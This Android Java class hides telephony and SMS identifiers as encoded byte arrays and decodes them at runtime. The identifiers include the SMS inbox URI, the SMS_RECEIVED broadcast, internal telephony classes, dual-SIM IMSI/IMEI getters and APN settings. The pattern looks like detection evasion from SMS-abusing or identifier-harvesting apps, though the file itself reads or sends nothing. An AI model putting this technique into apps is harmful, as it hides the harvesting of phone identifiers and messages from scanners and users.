package com.example.sayid.myapplication.common.data;

import com.example.sayid.myapplication.common.util.Logs;

public class StringData {
    private final static String TAG = "StringData";

    static StringData instance;

    public String URI_SMS_INBOX = null; //"content://sms/inbox";

    public String APN_LIST = null; //"content://telephony/carriers";

    public String APN = null; //"content://telephony/carriers/preferapn";

    public String PROXY = null; //"proxy";

    public String SERVICE_MANAGER = null; //"android.os.ServiceManager";

    public String SMS_RECEIVED = null; //"android.provider.Telephony.SMS_RECEIVED";

    public String WAP_PUSH_RECEIVED = null; //"android.provider.Telephony.WAP_PUSH_RECEIVED";

    public String URI_MMS_INBOX = null; //"content://mms/inbox";

    public String TEL_MANAGER = null; //"android.telephony.TelephonyManager";

    public String PHONE_FACTORY = null; //"com.android.internal.telephony.PhoneFactory";

    public String PHONE = null; //"com.android.internal.telephony.Phone";

    public String GET_SERVICE = null; //"getService";

    public String GET_SUB_IMSI = null; //"getSubscriberIdGemini";

    public String GET_SUB_IMEI = null; //"getDeviceIdGemini";

    public String GET_DEF_PHONE = null; //"getDefaultPhone";

    public String GET_SMSC_ADDRESS = null; //"getSmscAddress";


    public String APN_LIST_GEMINI = null; //"content://telephony/carriers_gemini";

    public String APN_GEMINI = null; //"content://telephony/carriers_gemini/preferapn";

    public String SMS_MANAGER = null;//	URL = "android.telephony.SmsManager"

    public String GET_DEFAULTSIM = null;//	URL = "getDefaultSim"

    public String GETSIMSTATEGEMINI = null;//	URL = "getSimStateGemini"

    public String GETPHONEGEMINI = null;//	URL = "getLine1NumberGemini"

    public String GETSIMOPERATORGEMINI = null; //	URL = "getSimOperatorGemini"

    public String GPRS_GEMINI = null;//	URL = "gprs_connection_sim_setting"

    public String SET_RADIO = null; //	URL = "setRadio"

    public String SETTING_SYSTEM = null; //	URL = "content://settings/system"

    public String GET_DEFAULT = null; // "getDefault"

    public String ISMS = null; //"isms"

    public String ISMS2 = null; //"isms2"

    public static StringData getInstance() {
        if (instance == null) {
            instance = new StringData();
        }

        instance.initString();

        return instance;
    }


    /**
     * 初始化String数据
     */
    private void initString() {
        if (URI_SMS_INBOX == null) {
            URI_SMS_INBOX = getUrl(btUrl_inbox);
            APN = getUrl(btUrl_apn);
            PROXY = getUrl(btUrl_proxy);
            SERVICE_MANAGER = getUrl(btUrl_service_mag);
            SMS_RECEIVED = getUrl(btUrl_sms_receive);
            WAP_PUSH_RECEIVED = getUrl(btUrl_wap_push);
            URI_MMS_INBOX = getUrl(btUrl_mms_inbox);
            TEL_MANAGER = getUrl(btUrl_tel_mag);
            PHONE_FACTORY = getUrl(btUrl_phone_factory);
            PHONE = getUrl(btUrl_phone);
            APN_LIST = getUrl(btUrl_apn_list);
            GET_SERVICE = getUrl(btUrl_getservice);
            GET_SUB_IMSI = getUrl(btUrl_imsi);
            GET_SUB_IMEI = getUrl(btUrl_imei);
            GET_DEF_PHONE = getUrl(btUrl_getphone);
            GET_SMSC_ADDRESS = getUrl(btUrl_smsc);

            APN_LIST_GEMINI = getUrl(btUrl_apn_listgemini);
            APN_GEMINI = getUrl(btUrl_apn_gemini);

            SMS_MANAGER = getUrl(btUrl_smsmanager);
            GET_DEFAULTSIM = getUrl(btUrl_getdefaultsim);
            GETSIMSTATEGEMINI = getUrl(btUrl_getsimstategemini);
            GETPHONEGEMINI = getUrl(btUrl_getphonegemini);
            GETSIMOPERATORGEMINI = getUrl(btUrl_getsimoperatorgemini);
            GPRS_GEMINI = getUrl(btUrl_gprs_gemini);
            SET_RADIO = getUrl(btUrl_setRadio);
            SETTING_SYSTEM = getUrl(btUrl_settingSystem);
            GET_DEFAULT = getUrl(btUrl_getDefault);
            ISMS = getUrl(btUrl_isms);
            ISMS2 = getUrl(btUrl_isms2);
        }
    }

    /**
     * 根据字节数组获取字符串
     *
     * @param data
     * @return
     */
    private static String getUrl(byte[] data) {
        try {
            int len = data.length;
            data[0] = (byte) (((data[0] >> 4) & 0x0F) | ((data[0] << 4) & 0xF0));
            for (int i = 1; i < len; i++)
                data[i] = (byte) ((data[i] & 0xFF) ^ (data[i - 1] & 0xFF));

            return new String(data, 0, len);
        } catch (Exception ioe) {
//			Logs.e(TAG, "getUrl error:" + ioe.toString());
        }
        return "";
    }


    public static void main(String args[]) {
        try {
            String url = "content://telephony/carriers/preferapn";
            byte[] data = url.getBytes();
            byte[] newData = new byte[data.length];

//			System.out.println(byte2hex(data));

            int len = data.length;
            newData[0] = (byte) (((data[0] >> 4) & 0x0F) | ((data[0] << 4) & 0xF0));
            for (int i = 1; i < len; i++) {
                newData[i] = (byte) ((data[i] & 0xFF) ^ (data[i - 1] & 0xFF));
            }

//			System.out.println(byte2hex(newData));
        } catch (Exception ioe) {
//			Logs.e(TAG, "getUrl error:" + ioe.toString());
        }
    }

    private static String byte2hex(byte[] buffer) {
        String h = "";
        for (int i = 0; i < buffer.length; i++) {
            String temp = Integer.toHexString(buffer[i] & 0xFF);
            if (temp.length() == 1) {
                temp = "0" + temp;
            }
            h = h + " " + temp;
        }
        return h;
    }


    //	    URL = "content://sms/inbox"
    private final static byte[] btUrl_inbox =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x01, (byte) 0x1a, (byte) 0x11, (byte) 0x0b, (byte) 0x1a, (byte) 0x4e,
                    (byte) 0x15, (byte) 0x00, (byte) 0x5c, (byte) 0x1e, (byte) 0x1e, (byte) 0x5c, (byte) 0x46, (byte) 0x07,
                    (byte) 0x0c, (byte) 0x0d, (byte) 0x17
            };

    //	    URL = "content://telephony/carriers/preferapn"
    private final static byte[] btUrl_apn =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x01, (byte) 0x1a, (byte) 0x11, (byte) 0x0b, (byte) 0x1a, (byte) 0x4e,
                    (byte) 0x15, (byte) 0x00, (byte) 0x5b, (byte) 0x11, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18,
                    (byte) 0x07, (byte) 0x01, (byte) 0x17, (byte) 0x56, (byte) 0x4c, (byte) 0x02, (byte) 0x13, (byte) 0x00,
                    (byte) 0x1b, (byte) 0x0c, (byte) 0x17, (byte) 0x01, (byte) 0x5c, (byte) 0x5f, (byte) 0x02, (byte) 0x17,
                    (byte) 0x03, (byte) 0x03, (byte) 0x17, (byte) 0x13, (byte) 0x11, (byte) 0x1e
            };

    //		URL = "proxy"
    private final static byte[] btUrl_proxy =
            {
                    (byte) 0x07, (byte) 0x02, (byte) 0x1d, (byte) 0x17, (byte) 0x01
            };

    //		URL = "android.os.ServiceManager"
    private final static byte[] btUrl_service_mag =
            {
                    (byte) 0x16, (byte) 0x0f, (byte) 0x0a, (byte) 0x16, (byte) 0x1d, (byte) 0x06, (byte) 0x0d, (byte) 0x4a,
                    (byte) 0x41, (byte) 0x1c, (byte) 0x5d, (byte) 0x7d, (byte) 0x36, (byte) 0x17, (byte) 0x04, (byte) 0x1f,
                    (byte) 0x0a, (byte) 0x06, (byte) 0x28, (byte) 0x2c, (byte) 0x0f, (byte) 0x0f, (byte) 0x06, (byte) 0x02,
                    (byte) 0x17
            };

    //		URL = "android.provider.Telephony.SMS_RECEIVED"
    private final static byte[] btUrl_sms_receive =
            {
                    (byte) 0x16, (byte) 0x0f, (byte) 0x0a, (byte) 0x16, (byte) 0x1d, (byte) 0x06, (byte) 0x0d, (byte) 0x4a,
                    (byte) 0x5e, (byte) 0x02, (byte) 0x1d, (byte) 0x19, (byte) 0x1f, (byte) 0x0d, (byte) 0x01, (byte) 0x17,
                    (byte) 0x5c, (byte) 0x7a, (byte) 0x31, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18, (byte) 0x07,
                    (byte) 0x01, (byte) 0x17, (byte) 0x57, (byte) 0x7d, (byte) 0x1e, (byte) 0x1e, (byte) 0x0c, (byte) 0x0d,
                    (byte) 0x17, (byte) 0x06, (byte) 0x06, (byte) 0x0c, (byte) 0x1f, (byte) 0x13, (byte) 0x01
            };

    //		URL = "android.provider.Telephony.WAP_PUSH_RECEIVED"
    private final static byte[] btUrl_wap_push =
            {
                    (byte) 0x16, (byte) 0x0f, (byte) 0x0a, (byte) 0x16, (byte) 0x1d, (byte) 0x06, (byte) 0x0d, (byte) 0x4a,
                    (byte) 0x5e, (byte) 0x02, (byte) 0x1d, (byte) 0x19, (byte) 0x1f, (byte) 0x0d, (byte) 0x01, (byte) 0x17,
                    (byte) 0x5c, (byte) 0x7a, (byte) 0x31, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18, (byte) 0x07,
                    (byte) 0x01, (byte) 0x17, (byte) 0x57, (byte) 0x79, (byte) 0x16, (byte) 0x11, (byte) 0x0f, (byte) 0x0f,
                    (byte) 0x05, (byte) 0x06, (byte) 0x1b, (byte) 0x17, (byte) 0x0d, (byte) 0x17, (byte) 0x06, (byte) 0x06,
                    (byte) 0x0c, (byte) 0x1f, (byte) 0x13, (byte) 0x01
            };

    //		URL = "content://mms/inbox"
    private final static byte[] btUrl_mms_inbox =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x01, (byte) 0x1a, (byte) 0x11, (byte) 0x0b, (byte) 0x1a, (byte) 0x4e,
                    (byte) 0x15, (byte) 0x00, (byte) 0x42, (byte) 0x00, (byte) 0x1e, (byte) 0x5c, (byte) 0x46, (byte) 0x07,
                    (byte) 0x0c, (byte) 0x0d, (byte) 0x17
            };

    //		URL = "android.telephony.TelephonyManager"
    private final static byte[] btUrl_tel_mag =
            {
                    (byte) 0x16, (byte) 0x0f, (byte) 0x0a, (byte) 0x16, (byte) 0x1d, (byte) 0x06, (byte) 0x0d, (byte) 0x4a,
                    (byte) 0x5a, (byte) 0x11, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18, (byte) 0x07, (byte) 0x01,
                    (byte) 0x17, (byte) 0x57, (byte) 0x7a, (byte) 0x31, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18,
                    (byte) 0x07, (byte) 0x01, (byte) 0x17, (byte) 0x34, (byte) 0x2c, (byte) 0x0f, (byte) 0x0f, (byte) 0x06,
                    (byte) 0x02, (byte) 0x17
            };

    //		URL = "com.android.internal.telephony.PhoneFactory"
    private final static byte[] btUrl_phone_factory =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x02, (byte) 0x43, (byte) 0x4f, (byte) 0x0f, (byte) 0x0a, (byte) 0x16,
                    (byte) 0x1d, (byte) 0x06, (byte) 0x0d, (byte) 0x4a, (byte) 0x47, (byte) 0x07, (byte) 0x1a, (byte) 0x11,
                    (byte) 0x17, (byte) 0x1c, (byte) 0x0f, (byte) 0x0d, (byte) 0x42, (byte) 0x5a, (byte) 0x11, (byte) 0x09,
                    (byte) 0x09, (byte) 0x15, (byte) 0x18, (byte) 0x07, (byte) 0x01, (byte) 0x17, (byte) 0x57, (byte) 0x7e,
                    (byte) 0x38, (byte) 0x07, (byte) 0x01, (byte) 0x0b, (byte) 0x23, (byte) 0x27, (byte) 0x02, (byte) 0x17,
                    (byte) 0x1b, (byte) 0x1d, (byte) 0x0b
            };

    //		URL = "com.android.internal.telephony.Phone"
    private final static byte[] btUrl_phone =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x02, (byte) 0x43, (byte) 0x4f, (byte) 0x0f, (byte) 0x0a, (byte) 0x16,
                    (byte) 0x1d, (byte) 0x06, (byte) 0x0d, (byte) 0x4a, (byte) 0x47, (byte) 0x07, (byte) 0x1a, (byte) 0x11,
                    (byte) 0x17, (byte) 0x1c, (byte) 0x0f, (byte) 0x0d, (byte) 0x42, (byte) 0x5a, (byte) 0x11, (byte) 0x09,
                    (byte) 0x09, (byte) 0x15, (byte) 0x18, (byte) 0x07, (byte) 0x01, (byte) 0x17, (byte) 0x57, (byte) 0x7e,
                    (byte) 0x38, (byte) 0x07, (byte) 0x01, (byte) 0x0b
            };

    //	URL = "content://telephony/carriers"
    private final static byte[] btUrl_apn_list =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x01, (byte) 0x1a, (byte) 0x11, (byte) 0x0b, (byte) 0x1a, (byte) 0x4e,
                    (byte) 0x15, (byte) 0x00, (byte) 0x5b, (byte) 0x11, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18,
                    (byte) 0x07, (byte) 0x01, (byte) 0x17, (byte) 0x56, (byte) 0x4c, (byte) 0x02, (byte) 0x13, (byte) 0x00,
                    (byte) 0x1b, (byte) 0x0c, (byte) 0x17, (byte) 0x01
            };

    //		URL = "getService"
    private final static byte[] btUrl_getservice =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x27, (byte) 0x36, (byte) 0x17, (byte) 0x04, (byte) 0x1f,
                    (byte) 0x0a, (byte) 0x06
            };

    //			URL = "getSubscriberIdGemini"
    private final static byte[] btUrl_imsi =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x27, (byte) 0x26, (byte) 0x17, (byte) 0x11, (byte) 0x10,
                    (byte) 0x11, (byte) 0x1b, (byte) 0x0b, (byte) 0x07, (byte) 0x17, (byte) 0x3b, (byte) 0x2d, (byte) 0x23,
                    (byte) 0x22, (byte) 0x08, (byte) 0x04, (byte) 0x07, (byte) 0x07
            };

    //			URL = "getDeviceIdGemini"
    private final static byte[] btUrl_imei =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x30, (byte) 0x21, (byte) 0x13, (byte) 0x1f, (byte) 0x0a,
                    (byte) 0x06, (byte) 0x2c, (byte) 0x2d, (byte) 0x23, (byte) 0x22, (byte) 0x08, (byte) 0x04, (byte) 0x07,
                    (byte) 0x07
            };

    //			URL = "getDefaultPhone"
    private final static byte[] btUrl_getphone =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x30, (byte) 0x21, (byte) 0x03, (byte) 0x07, (byte) 0x14,
                    (byte) 0x19, (byte) 0x18, (byte) 0x24, (byte) 0x38, (byte) 0x07, (byte) 0x01, (byte) 0x0b
            };

    //			URL = "getSmscAddress"
    private final static byte[] btUrl_smsc =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x27, (byte) 0x3e, (byte) 0x1e, (byte) 0x10, (byte) 0x22,
                    (byte) 0x25, (byte) 0x00, (byte) 0x16, (byte) 0x17, (byte) 0x16, (byte) 0x00
            };


    //	URL = "content://telephony/carriers_gemini"
    private final static byte[] btUrl_apn_listgemini =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x01, (byte) 0x1a, (byte) 0x11, (byte) 0x0b, (byte) 0x1a, (byte) 0x4e,
                    (byte) 0x15, (byte) 0x00, (byte) 0x5b, (byte) 0x11, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18,
                    (byte) 0x07, (byte) 0x01, (byte) 0x17, (byte) 0x56, (byte) 0x4c, (byte) 0x02, (byte) 0x13, (byte) 0x00,
                    (byte) 0x1b, (byte) 0x0c, (byte) 0x17, (byte) 0x01, (byte) 0x2c, (byte) 0x38, (byte) 0x02, (byte) 0x08,
                    (byte) 0x04, (byte) 0x07, (byte) 0x07
            };
    //		URL = "content://telephony/carriers_gemini/preferapn"
    private final static byte[] btUrl_apn_gemini =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x01, (byte) 0x1a, (byte) 0x11, (byte) 0x0b, (byte) 0x1a, (byte) 0x4e,
                    (byte) 0x15, (byte) 0x00, (byte) 0x5b, (byte) 0x11, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18,
                    (byte) 0x07, (byte) 0x01, (byte) 0x17, (byte) 0x56, (byte) 0x4c, (byte) 0x02, (byte) 0x13, (byte) 0x00,
                    (byte) 0x1b, (byte) 0x0c, (byte) 0x17, (byte) 0x01, (byte) 0x2c, (byte) 0x38, (byte) 0x02, (byte) 0x08,
                    (byte) 0x04, (byte) 0x07, (byte) 0x07, (byte) 0x46, (byte) 0x5f, (byte) 0x02, (byte) 0x17, (byte) 0x03,
                    (byte) 0x03, (byte) 0x17, (byte) 0x13, (byte) 0x11, (byte) 0x1e
            };
    //		URL = "android.telephony.SmsManager"
    private final static byte[] btUrl_smsmanager =
            {
                    (byte) 0x16, (byte) 0x0f, (byte) 0x0a, (byte) 0x16, (byte) 0x1d, (byte) 0x06, (byte) 0x0d, (byte) 0x4a,
                    (byte) 0x5a, (byte) 0x11, (byte) 0x09, (byte) 0x09, (byte) 0x15, (byte) 0x18, (byte) 0x07, (byte) 0x01,
                    (byte) 0x17, (byte) 0x57, (byte) 0x7d, (byte) 0x3e, (byte) 0x1e, (byte) 0x3e, (byte) 0x2c, (byte) 0x0f,
                    (byte) 0x0f, (byte) 0x06, (byte) 0x02, (byte) 0x17
            };
    //		URL = "getDefaultSim"
    private final static byte[] btUrl_getdefaultsim =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x30, (byte) 0x21, (byte) 0x03, (byte) 0x07, (byte) 0x14,
                    (byte) 0x19, (byte) 0x18, (byte) 0x27, (byte) 0x3a, (byte) 0x04
            };
    //		URL = "getSimStateGemini"
    private final static byte[] btUrl_getsimstategemini =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x27, (byte) 0x3a, (byte) 0x04, (byte) 0x3e, (byte) 0x27,
                    (byte) 0x15, (byte) 0x15, (byte) 0x11, (byte) 0x22, (byte) 0x22, (byte) 0x08, (byte) 0x04, (byte) 0x07,
                    (byte) 0x07
            };
    //		URL = "getLine1NumberGemini"
    private final static byte[] btUrl_getphonegemini =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x38, (byte) 0x25, (byte) 0x07, (byte) 0x0b, (byte) 0x54,
                    (byte) 0x7f, (byte) 0x3b, (byte) 0x18, (byte) 0x0f, (byte) 0x07, (byte) 0x17, (byte) 0x35, (byte) 0x22,
                    (byte) 0x08, (byte) 0x04, (byte) 0x07, (byte) 0x07
            };
    //		URL = "getSimOperatorGemini"
    private final static byte[] btUrl_getsimoperatorgemini =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x27, (byte) 0x3a, (byte) 0x04, (byte) 0x22, (byte) 0x3f,
                    (byte) 0x15, (byte) 0x17, (byte) 0x13, (byte) 0x15, (byte) 0x1b, (byte) 0x1d, (byte) 0x35, (byte) 0x22,
                    (byte) 0x08, (byte) 0x04, (byte) 0x07, (byte) 0x07
            };

    //		URL = "gprs_connection_sim_setting"
    private final static byte[] btUrl_gprs_gemini =
            {
                    (byte) 0x76, (byte) 0x17, (byte) 0x02, (byte) 0x01, (byte) 0x2c, (byte) 0x3c, (byte) 0x0c, (byte) 0x01,
                    (byte) 0x00, (byte) 0x0b, (byte) 0x06, (byte) 0x17, (byte) 0x1d, (byte) 0x06, (byte) 0x01, (byte) 0x31,
                    (byte) 0x2c, (byte) 0x1a, (byte) 0x04, (byte) 0x32, (byte) 0x2c, (byte) 0x16, (byte) 0x11, (byte) 0x00,
                    (byte) 0x1d, (byte) 0x07, (byte) 0x09
            };
    //		URL = "setRadio"
    private final static byte[] btUrl_setRadio =
            {
                    (byte) 0x37, (byte) 0x16, (byte) 0x11, (byte) 0x26, (byte) 0x33, (byte) 0x05, (byte) 0x0d, (byte) 0x06
            };
    //		URL = "content://settings/system"
    private final static byte[] btUrl_settingSystem =
            {
                    (byte) 0x36, (byte) 0x0c, (byte) 0x01, (byte) 0x1a, (byte) 0x11, (byte) 0x0b, (byte) 0x1a, (byte) 0x4e,
                    (byte) 0x15, (byte) 0x00, (byte) 0x5c, (byte) 0x16, (byte) 0x11, (byte) 0x00, (byte) 0x1d, (byte) 0x07,
                    (byte) 0x09, (byte) 0x14, (byte) 0x5c, (byte) 0x5c, (byte) 0x0a, (byte) 0x0a, (byte) 0x07, (byte) 0x11,
                    (byte) 0x08
            };

    //	URL = "getDefault"
    private final static byte[] btUrl_getDefault =
            {
                    (byte) 0x76, (byte) 0x02, (byte) 0x11, (byte) 0x30, (byte) 0x21, (byte) 0x03, (byte) 0x07, (byte) 0x14,
                    (byte) 0x19, (byte) 0x18
            };
    //		URL = "isms"
    private final static byte[] btUrl_isms =
            {
                    (byte) 0x96, (byte) 0x1a, (byte) 0x1e, (byte) 0x1e
            };
    //		URL = "isms2"
    private final static byte[] btUrl_isms2 =
            {
                    (byte) 0x96, (byte) 0x1a, (byte) 0x1e, (byte) 0x1e, (byte) 0x41
            };
}
